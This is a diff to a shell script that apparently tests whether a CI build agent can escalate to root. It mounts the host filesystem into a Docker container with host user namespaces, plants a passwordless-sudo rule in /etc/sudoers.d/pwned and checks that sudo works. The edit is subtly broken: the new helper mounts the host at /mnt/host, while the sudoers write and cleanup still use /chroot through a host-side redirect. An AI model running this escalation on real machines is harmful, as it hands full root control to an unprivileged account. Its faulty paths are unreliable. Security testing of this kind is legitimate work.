@@ -2,21 +2,25 @@
 
 set -euo pipefail
 
+run-as-root() {
+  docker run --userns=host -v /:/mnt/host -w /mnt/host alpine:latest "$@"
+}
+
 echo ~~~ Creating file as root
-docker run --userns=host -v /:/chroot -w /chroot alpine:latest touch file-created-as-root
+run-as-root touch file-created-as-root
 
 echo +++ Checking /
 ls -lA /
 
 echo ~~~ Cleaning up
-docker run --userns=host -v /:/chroot -w /chroot alpine:latest rm file-created-as-root
+run-as-root rm file-created-as-root
 
 echo +++ Checking /
 ls -lA /
 
 echo +++ Checking /etc
 ls -lA /etc
-ls -lA /etc/sudoers.d
+run-as-root ls -lA /etc/sudoers.d
 
 echo +++ Testing sudo
 if sudo --non-interactive whoami; then
@@ -26,7 +30,7 @@ else
 fi
 
 echo --- Modifying sudoers
-docker run --userns=host -v /:/chroot -w /chroot alpine:latest echo "'buildkite-agent ALL=(ALL) NOPASSWD: ALL'" > /chroot/etc/sudoers.d/pwned
+run-as-root echo "'buildkite-agent ALL=(ALL) NOPASSWD: ALL'" > /chroot/etc/sudoers.d/pwned
 
 echo +++ Testing sudo
 if sudo --non-interactive whoami; then
@@ -36,4 +40,4 @@ else
 fi
 
 echo --- Cleaning up
-docker run --userns=host -v /:/chroot -w /chroot alpine:latest rm -f /chroot/etc/sudoers.d/pwned
+run-as-root rm -f /chroot/etc/sudoers.d/pwned
